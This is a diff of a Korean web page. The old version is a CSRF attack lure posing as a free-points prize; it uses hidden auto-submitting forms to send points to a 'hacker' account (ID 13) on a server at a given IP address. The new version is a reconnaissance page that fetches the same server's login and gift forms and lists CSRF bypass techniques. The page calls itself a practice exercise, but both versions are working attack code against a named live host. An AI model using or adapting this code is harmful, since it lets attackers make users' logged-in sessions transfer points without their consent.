@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 무료 포인트 받기</title>
+    <title>🔍 서버 분석 도구</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -15,34 +15,16 @@
             margin: 0;
             color: white;
         }
-        .gift-container {
+        .container {
             text-align: center;
             background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(10px);
             padding: 50px;
             border-radius: 20px;
             box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
+            max-width: 800px;
         }
-        .gift-box {
-            font-size: 8em;
-            animation: bounce 2s infinite;
-        }
-        @keyframes bounce {
-            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
-            40% { transform: translateY(-20px); }
-            60% { transform: translateY(-10px); }
-        }
-        .message {
-            font-size: 1.5em;
-            margin: 20px 0;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-        }
-        .auto-message {
-            font-size: 1.2em;
-            color: #FFD700;
-            margin-top: 30px;
-        }
-        .step-button {
+        .button {
             background: linear-gradient(45deg, #FF6B6B, #FF8E53);
             border: none;
             padding: 15px 30px;
@@ -53,163 +35,184 @@
             margin: 10px;
             transition: transform 0.3s;
         }
-        .step-button:hover {
+        .button:hover {
             transform: scale(1.05);
+        }
+        #result {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: left;
+            font-family: monospace;
+            max-height: 400px;
+            overflow-y: auto;
         }
     </style>
 </head>
 <body>
-    <div class="gift-container">
-        <div class="gift-box">🎁</div>
-        <h1>축하합니다!</h1>
-        <p class="message">🎉 특별 이벤트에 당첨되셨습니다!</p>
+    <div class="container">
+        <h1>🔍 서버 분석 도구</h1>
+        <p>실제 form 구조와 필요한 파라미터를 분석합니다</p>
         
-        <div id="mainContent">
-            <p class="auto-message">📋 CSRF 공격 실습 과정</p>
-            
-            <div style="margin: 30px 0;">
-                <button class="step-button" onclick="step1_openSite()">
-                    1️⃣ 사이트에 로그인하기
-                </button>
-                <br>
-                <button class="step-button" onclick="step2_executeAttack()">
-                    2️⃣ 공격 실행하기
-                </button>
-                <br>
-                <button class="step-button" onclick="step3_checkResult()">
-                    3️⃣ 결과 확인하기
-                </button>
-            </div>
-            
-            <div id="instructions" style="margin-top: 30px;">
-                <p style="font-size: 0.9em; color: #FFD700;">
-                    💡 <strong>사용법:</strong><br>
-                    1. 먼저 "사이트에 로그인하기" 버튼을 클릭<br>
-                    2. 새 탭에서 로그인 완료 후 이 탭으로 돌아오기<br>
-                    3. "공격 실행하기" 버튼 클릭<br>
-                    4. "결과 확인하기"로 성공 여부 확인
-                </p>
-            </div>
-        </div>
+        <button class="button" onclick="analyzeLoginForm()">
+            🔐 로그인 폼 분석
+        </button>
+        
+        <button class="button" onclick="analyzeProfilePage()">
+            👤 프로필 페이지 분석
+        </button>
+        
+        <button class="button" onclick="analyzeGiftForm()">
+            🎁 선물 폼 분석
+        </button>
+        
+        <button class="button" onclick="testCSRFBypass()">
+            ⚡ CSRF 우회 테스트
+        </button>
+        
+        <div id="result"></div>
     </div>
 
-    <!-- 실제 공격 Form들 (숨겨짐) -->
-    <form id="attack1" method="POST" action="http://3.36.66.216/profile.php" target="result1" style="display: none;">
-        <input type="hidden" name="receiver_id" value="13">
-        <input type="hidden" name="points" value="100">
-        <input type="hidden" name="send_gift" value="1">
-        <input type="hidden" name="gift_type" value="diamond">
-        <input type="hidden" name="message" value="CSRF_Step_Attack_1">
-    </form>
-    
-    <form id="attack2" method="POST" action="http://3.36.66.216/profile.php" target="result2" style="display: none;">
-        <input type="hidden" name="receiver_id" value="13">
-        <input type="hidden" name="points" value="75">
-        <input type="hidden" name="send_gift" value="1">
-        <input type="hidden" name="gift_type" value="coffee">
-        <input type="hidden" name="message" value="CSRF_Step_Attack_2">
-    </form>
-    
-    <form id="attack3" method="POST" action="http://3.36.66.216/profile.php" target="result3" style="display: none;">
-        <input type="hidden" name="receiver_id" value="13">
-        <input type="hidden" name="points" value="50">
-        <input type="hidden" name="send_gift" value="1">
-        <input type="hidden" name="gift_type" value="cake">
-        <input type="hidden" name="message" value="CSRF_Step_Attack_3">
-    </form>
-
-    <!-- 결과 확인용 숨겨진 iframe들 -->
-    <iframe name="result1" style="display: none;"></iframe>
-    <iframe name="result2" style="display: none;"></iframe>
-    <iframe name="result3" style="display: none;"></iframe>
-
     <script>
-        let loginWindowRef = null;
-        let attackExecuted = false;
-        
-        function step1_openSite() {
-            console.log('📂 1단계: 로그인 창 열기');
+        function analyzeLoginForm() {
+            showResult('🔐 로그인 폼 분석 중...');
             
-            // 로그인 창 열기
-            loginWindowRef = window.open(
-                'http://3.36.66.216/login.php', 
-                'loginWindow',
-                'width=800,height=600,scrollbars=yes,resizable=yes'
-            );
-            
-            // 지시사항 업데이트
-            document.getElementById('instructions').innerHTML = 
-                '<p style="color: #00FF88;">✅ 로그인 창이 열렸습니다!</p>' +
-                '<p style="font-size: 0.9em;">새 탭에서 로그인을 완료한 후, 이 탭으로 돌아와서 "공격 실행하기"를 클릭하세요.</p>' +
-                '<p style="color: #FFB347; font-size: 0.8em;">⚠️ 로그인 탭을 닫지 마세요! (세션 유지 필요)</p>';
+            // 로그인 페이지의 실제 form 구조 확인
+            fetch('http://3.36.66.216/login.php')
+                .then(response => response.text())
+                .then(html => {
+                    const parser = new DOMParser();
+                    const doc = parser.parseFromString(html, 'text/html');
+                    const forms = doc.getElementsByTagName('form');
+                    
+                    let result = '📋 로그인 폼 구조:\n\n';
+                    for (let form of forms) {
+                        result += `Action: ${form.action}\n`;
+                        result += `Method: ${form.method}\n`;
+                        result += 'Fields:\n';
+                        
+                        const inputs = form.getElementsByTagName('input');
+                        for (let input of inputs) {
+                            result += `  - ${input.name}: ${input.type} (value: ${input.value})\n`;
+                        }
+                        result += '\n';
+                    }
+                    
+                    showResult(result);
+                })
+                .catch(err => {
+                    showResult('❌ CORS 에러: ' + err.message + '\n\n대안: 브라우저에서 직접 확인 필요');
+                });
         }
         
-        function step2_executeAttack() {
-            if (attackExecuted) {
-                alert('이미 공격이 실행되었습니다!');
-                return;
-            }
+        function analyzeProfilePage() {
+            showResult('👤 프로필 페이지 분석 중...');
             
-            console.log('🚀 2단계: CSRF 공격 실행');
-            attackExecuted = true;
+            // 실제 선물 보내기 form 분석
+            const testUrl = 'http://3.36.66.216/profile.php';
             
-            // UI 업데이트
-            document.getElementById('instructions').innerHTML = 
-                '<p style="color: #FFD700;">⚡ 공격 실행 중...</p>';
+            // iframe으로 페이지 로드해서 분석
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = testUrl;
             
-            // 공격 실행
+            iframe.onload = function() {
+                try {
+                    const doc = iframe.contentDocument;
+                    const forms = doc.getElementsByTagName('form');
+                    
+                    let result = '🎁 선물 폼 구조:\n\n';
+                    for (let form of forms) {
+                        result += `Action: ${form.action}\n`;
+                        result += `Method: ${form.method}\n`;
+                        result += 'Fields:\n';
+                        
+                        const inputs = form.getElementsByTagName('input');
+                        for (let input of inputs) {
+                            if (input.name) {
+                                result += `  - ${input.name}: ${input.type} (value: ${input.value})\n`;
+                            }
+                        }
+                        result += '\n';
+                    }
+                    
+                    showResult(result);
+                } catch (e) {
+                    showResult('❌ 크로스 오리진 접근 차단\n\n수동 확인 방법:\n1. http://3.36.66.216에 로그인\n2. 개발자 도구 > Elements 탭\n3. 선물 보내기 form 구조 확인');
+                }
+            };
+            
+            document.body.appendChild(iframe);
+            
             setTimeout(() => {
-                document.getElementById('attack1').submit();
-                console.log('📤 Attack 1: 100P');
-            }, 500);
-            
-            setTimeout(() => {
-                document.getElementById('attack2').submit();
-                console.log('📤 Attack 2: 75P');
-            }, 1000);
-            
-            setTimeout(() => {
-                document.getElementById('attack3').submit();
-                console.log('📤 Attack 3: 50P');
-            }, 1500);
-            
-            setTimeout(() => {
-                document.getElementById('instructions').innerHTML = 
-                    '<p style="color: #00FF88;">✅ 공격 완료!</p>' +
-                    '<p>총 225 포인트 전송 시도됨</p>' +
-                    '<p style="font-size: 0.9em;">"결과 확인하기"를 클릭하여 성공 여부를 확인하세요.</p>';
-            }, 2500);
+                if (iframe.parentNode) {
+                    iframe.parentNode.removeChild(iframe);
+                }
+            }, 5000);
         }
         
-        function step3_checkResult() {
-            console.log('🔍 3단계: 결과 확인');
+        function analyzeGiftForm() {
+            showResult('🎁 선물 폼 매개변수 분석...\n\n예상되는 필수 필드들:');
             
-            // 결과 확인 창 열기
-            window.open('http://3.36.66.216', 'resultWindow', 'width=800,height=600');
+            const expectedFields = [
+                'receiver_id - 받을 사람 ID',
+                'points - 포인트 수량', 
+                'send_gift - 선물 전송 플래그',
+                'gift_type - 선물 종류',
+                'message - 메시지',
+                'csrf_token - CSRF 토큰 (있을 가능성)',
+                'submit - 전송 버튼'
+            ];
             
-            document.getElementById('instructions').innerHTML = 
-                '<p style="color: #00FF88;">🔍 결과 확인 창이 열렸습니다!</p>' +
-                '<p style="font-size: 0.9em;">새 탭에서 hacker 계정의 포인트 증가를 확인해보세요.</p>' +
-                '<div style="margin-top: 20px;">' +
-                '<button class="step-button" onclick="resetAttack()">🔄 다시 시도</button>' +
-                '</div>';
+            let result = '📋 예상 필드 목록:\n\n';
+            expectedFields.forEach(field => {
+                result += `• ${field}\n`;
+            });
+            
+            result += '\n🔍 실제 확인 방법:\n';
+            result += '1. 사이트에 로그인\n';
+            result += '2. 선물 보내기 form에서 F12 개발자 도구\n';
+            result += '3. Network 탭에서 실제 전송 데이터 확인\n';
+            
+            showResult(result);
         }
         
-        function resetAttack() {
-            attackExecuted = false;
-            document.getElementById('instructions').innerHTML = 
-                '<p style="font-size: 0.9em; color: #FFD700;">' +
-                '💡 <strong>사용법:</strong><br>' +
-                '1. 먼저 "사이트에 로그인하기" 버튼을 클릭<br>' +
-                '2. 새 탭에서 로그인 완료 후 이 탭으로 돌아오기<br>' +
-                '3. "공격 실행하기" 버튼 클릭<br>' +
-                '4. "결과 확인하기"로 성공 여부 확인' +
-                '</p>';
+        function testCSRFBypass() {
+            showResult('⚡ CSRF 우회 기법 테스트 중...');
+            
+            // 다양한 우회 기법들 시도
+            const techniques = [
+                'Referer 헤더 조작',
+                'Origin 헤더 우회', 
+                'Content-Type 변경',
+                'GET 메소드 시도',
+                'JSON 형식 전송',
+                'Multipart 형식 시도'
+            ];
+            
+            let result = '🛠️ 시도 가능한 우회 기법들:\n\n';
+            techniques.forEach((tech, i) => {
+                result += `${i+1}. ${tech}\n`;
+            });
+            
+            result += '\n💡 권장 순서:\n';
+            result += '1. 먼저 실제 form 구조 파악\n';
+            result += '2. CSRF 토큰 존재 여부 확인\n';
+            result += '3. 필수 필드 정확히 매핑\n';
+            result += '4. 단순한 GET 요청부터 시도\n';
+            
+            showResult(result);
         }
         
-        console.log('🎯 단계별 CSRF 공격 시스템 준비됨');
-        console.log('📋 실습용 단계별 가이드');
-        console.log('🎯 타겟: hacker (ID: 13)');
+        function showResult(text) {
+            const resultDiv = document.getElementById('result');
+            resultDiv.textContent = text;
+            resultDiv.scrollTop = resultDiv.scrollHeight;
+        }
+        
+        console.log('🔍 서버 분석 도구 준비됨');
+        console.log('💡 실제 form 구조를 파악하여 정확한 공격 수행');
     </script>
 </body>
 </html>
